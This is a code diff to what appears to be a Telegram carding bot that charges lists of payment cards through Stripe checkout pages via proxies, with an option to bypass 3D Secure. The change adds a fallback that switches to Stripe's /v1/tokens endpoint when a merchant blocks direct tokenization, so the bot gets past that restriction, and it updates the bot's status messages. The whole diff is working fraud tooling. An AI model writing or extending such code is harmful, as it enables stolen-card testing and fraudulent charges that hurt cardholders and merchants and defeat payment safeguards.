@@ -491,6 +491,10 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                     print(f"[DEBUG] Retry attempt {attempt}...")
                 print(f"[DEBUG] Creating payment method...")
                 
+                pm_id = None
+                use_token = False
+                token_id = None
+                
                 async with s.post("https://api.stripe.com/v1/payment_methods", headers=HEADERS, data=pm_body, proxy=proxy_url) as r:
                     pm = await r.json()
                 
@@ -499,9 +503,44 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                     err_code = pm["error"].get("code", "")
                     dc = pm["error"].get("decline_code", "")
                     print(f"[DEBUG] PM Error: {err_msg[:60]}")
+                    
                     if "tokenization" in err_msg.lower():
-                        result["status"] = "NOT SUPPORTED"
-                        result["response"] = "Tokenization restricted by merchant"
+                        # Fallback: try /v1/tokens endpoint
+                        print(f"[DEBUG] PM blocked, trying /v1/tokens fallback...")
+                        token_body = f"card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&key={pk}"
+                        
+                        async with s.post("https://api.stripe.com/v1/tokens", headers=HEADERS, data=token_body, proxy=proxy_url) as r:
+                            tok = await r.json()
+                        
+                        if "error" in tok:
+                            tok_err = tok["error"].get("message", "Token error")
+                            tok_code = tok["error"].get("code", "")
+                            tok_dc = tok["error"].get("decline_code", "")
+                            print(f"[DEBUG] Token Error: {tok_err[:60]}")
+                            if "tokenization" in tok_err.lower():
+                                result["status"] = "NOT SUPPORTED"
+                                result["response"] = "Tokenization fully restricted"
+                            else:
+                                result["status"] = "DECLINED"
+                                if tok_dc:
+                                    result["response"] = f"[{tok_dc}] [{tok_err}]"
+                                elif tok_code:
+                                    result["response"] = f"[{tok_code}] [{tok_err}]"
+                                else:
+                                    result["response"] = tok_err
+                            result["time"] = round(time.perf_counter() - start, 2)
+                            print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
+                            return result
+                        
+                        token_id = tok.get("id")
+                        if not token_id:
+                            result["status"] = "FAILED"
+                            result["response"] = "No Token"
+                            result["time"] = round(time.perf_counter() - start, 2)
+                            return result
+                        
+                        use_token = True
+                        print(f"[DEBUG] Token created: {token_id}")
                     else:
                         result["status"] = "DECLINED"
                         if dc:
@@ -510,21 +549,25 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                             result["response"] = f"[{err_code}] [{err_msg}]"
                         else:
                             result["response"] = err_msg
-                    result["time"] = round(time.perf_counter() - start, 2)
-                    print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
-                    return result
+                        result["time"] = round(time.perf_counter() - start, 2)
+                        print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
+                        return result
+                else:
+                    pm_id = pm.get("id")
+                    if not pm_id:
+                        result["status"] = "FAILED"
+                        result["response"] = "No PM"
+                        result["time"] = round(time.perf_counter() - start, 2)
+                        return result
+                    print(f"[DEBUG] PM Response: {pm_id}")
                 
-                pm_id = pm.get("id")
-                if not pm_id:
-                    result["status"] = "FAILED"
-                    result["response"] = "No PM"
-                    result["time"] = round(time.perf_counter() - start, 2)
-                    return result
+                print(f"[DEBUG] Confirming payment... (bypass_3ds={bypass_3ds}, use_token={use_token})")
                 
-                print(f"[DEBUG] PM Response: {pm_id}")
-                print(f"[DEBUG] Confirming payment... (bypass_3ds={bypass_3ds})")
-                
-                conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
+                # Build confirm body based on method used
+                if use_token:
+                    conf_body = f"eid=NA&payment_method_data[type]=card&payment_method_data[card][token]={token_id}&payment_method_data[billing_details][name]={name}&payment_method_data[billing_details][email]={email}&payment_method_data[billing_details][address][country]={country}&payment_method_data[billing_details][address][line1]={line1}&payment_method_data[billing_details][address][city]={city}&payment_method_data[billing_details][address][postal_code]={zip_code}&payment_method_data[billing_details][address][state]={state}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
+                else:
+                    conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                 
                 if bypass_3ds:
                     conf_body += "&return_url=https://checkout.stripe.com"
@@ -582,10 +625,10 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
 
 async def check_tokenization_support(pk: str) -> dict:
     """Quick check if merchant allows direct API tokenization using a test card."""
-    result = {"supported": True, "error": None}
+    result = {"supported": True, "method": "payment_methods", "error": None}
     try:
         s = await get_session()
-        # Use Stripe test card to check tokenization support
+        # Try /v1/payment_methods first
         test_body = f"type=card&card[number]=4242424242424242&card[cvc]=123&card[exp_month]=12&card[exp_year]=30&key={pk}"
         async with s.post(
             "https://api.stripe.com/v1/payment_methods",
@@ -597,8 +640,27 @@ async def check_tokenization_support(pk: str) -> dict:
             if "error" in data:
                 err_msg = data["error"].get("message", "")
                 if "tokenization" in err_msg.lower():
-                    result["supported"] = False
-                    result["error"] = "Tokenization restricted by merchant"
+                    # PM blocked, try /v1/tokens fallback
+                    token_body = f"card[number]=4242424242424242&card[cvc]=123&card[exp_month]=12&card[exp_year]=30&key={pk}"
+                    async with s.post(
+                        "https://api.stripe.com/v1/tokens",
+                        headers=HEADERS,
+                        data=token_body,
+                        timeout=aiohttp.ClientTimeout(total=10)
+                    ) as r2:
+                        tok_data = await r2.json()
+                        if "error" in tok_data:
+                            tok_err = tok_data["error"].get("message", "")
+                            if "tokenization" in tok_err.lower():
+                                result["supported"] = False
+                                result["method"] = "none"
+                                result["error"] = "Fully restricted"
+                            else:
+                                # Token endpoint works but returned other error (expected for test card)
+                                result["method"] = "tokens"
+                        else:
+                            # Token created successfully
+                            result["method"] = "tokens"
     except:
         pass
     return result
@@ -921,7 +983,12 @@ async def co_handler(msg: Message):
     if not cards:
         # Check tokenization support during parse
         token_check = await check_tokenization_support(checkout_data['pk'])
-        token_display = "SUPPORTED ✅" if token_check['supported'] else "NOT SUPPORTED ❌"
+        if not token_check['supported']:
+            token_display = "NOT SUPPORTED ❌"
+        elif token_check.get('method') == 'tokens':
+            token_display = "TOKEN 🔑 (fallback)"
+        else:
+            token_display = "SUPPORTED ✅"
         
         currency = checkout_data.get('currency', '')
         sym = get_currency_symbol(currency)
@@ -967,12 +1034,14 @@ async def co_handler(msg: Message):
         await processing_msg.edit_text(
             "<blockquote><code>𝗡𝗼𝘁 𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱 🚫</code></blockquote>\n\n"
             f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
-            f"「❃」 𝗥𝗲𝗮𝘀𝗼𝗻 : <code>Tokenization restricted by merchant</code>\n"
-            "「❃」 𝗜𝗻𝗳𝗼 : <code>This checkout blocks direct API charging</code></blockquote>",
+            f"「❃」 𝗥𝗲𝗮𝘀𝗼𝗻 : <code>Tokenization fully restricted</code>\n"
+            "「❃」 𝗜𝗻𝗳𝗼 : <code>Both PM and Token endpoints blocked</code></blockquote>",
             parse_mode=ParseMode.HTML
         )
         return
     
+    token_method = token_check.get('method', 'payment_methods')
+    method_display = "TOKEN 🔑" if token_method == 'tokens' else "PM 💳"
     bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
     currency = checkout_data.get('currency', '')
     sym = get_currency_symbol(currency)
@@ -981,7 +1050,8 @@ async def co_handler(msg: Message):
     await processing_msg.edit_text(
         f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
         f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
-        f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
+        f"「❃」 �𝗲𝘁𝗵𝗼𝗱 : <code>{method_display}</code>\n"
+        f"「❃」 �𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
         f"「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{len(cards)}</code>\n"
         f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Starting...</code></blockquote>",
         parse_mode=ParseMode.HTML
